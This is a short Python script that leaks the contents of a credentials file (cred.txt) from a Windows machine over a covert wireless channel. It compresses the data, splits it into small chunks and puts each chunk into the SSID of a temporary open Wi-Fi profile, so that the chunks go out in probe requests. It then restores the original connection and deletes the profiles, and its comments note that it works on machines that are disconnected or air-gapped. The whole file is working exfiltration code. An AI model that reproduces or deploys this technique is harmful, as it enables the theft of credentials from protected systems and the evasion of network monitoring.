import time
import pywifi
import subprocess
from pywifi import const
import re
import zlib


#What the SSID Probe Requests will start with to identify
startChar = '*'
creds = open(r'C:\Users\n3oera\Desktop\cred.txt', 'rb').read()
currentProfile = None


#Note the current profile so it can reconnect after transmission of data
def getCurrentProfile():
    global currentProfile
    try:
        netshOutput = subprocess.Popen('netsh wlan show interfaces', shell=True, stdout=subprocess.PIPE)
        output = list(map(str.strip, netshOutput.stdout.read().decode("utf-8").replace('\r', '').strip().split('\n')))
        for x in output:
            if 'Profile' in x and "Connection" not in x:
                stringProfile = (x.replace(re.findall('^Profile[ ]*: ', x)[0], ''))
                for profile in iface.network_profiles():
                    if profile.ssid == stringProfile: currentProfile = profile
    except Exception as e:
        #No current profile, either disconnected or airgapped
        pass


def compress(data):
    exfilList = []
    maxLength = 6
    compressed = zlib.compress(data, 1)

    #Low max to be sure no errors thrown, divide it into a list and add in the special character
    if len(compressed) >= 32:
        temp = (compressed[0 + i:maxLength + i] for i in range(0, len(compressed), maxLength))
        exfilList = [section for section in temp]
        return exfilList

    else:
        exfilList.append(compressed)
        return exfilList




def extract(data):

    #print('Trying to extract ' + str(len(data)) + ' pieces.')

    for piece in data:
        try:
            piece = (startChar + str(piece))
            extractProfile = pywifi.Profile()
            extractProfile.ssid = piece
            extractProfile.auth = const.AUTH_ALG_OPEN
            extractProfile.akm.append(const.AKM_TYPE_NONE)
            extractProfile.cipher = const.CIPHER_TYPE_NONE
            extractProfile = iface.add_network_profile(extractProfile)
            iface.connect(extractProfile)
            time.sleep(1)

            print('Extracted: ' + piece + ' with a length of \t' + str(len(piece)))
            #Two second delay between SSID Probe Requests, allows for reconnection of network

            iface.connect(currentProfile)

            # Remove the created Profile
            iface.remove_network_profile(extractProfile)

        except Exception as e:
            #Error during exfiltration
            pass




if __name__ == '__main__':

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.name()
    getCurrentProfile()
    compressedData = compress(creds)
    extract(compressedData)




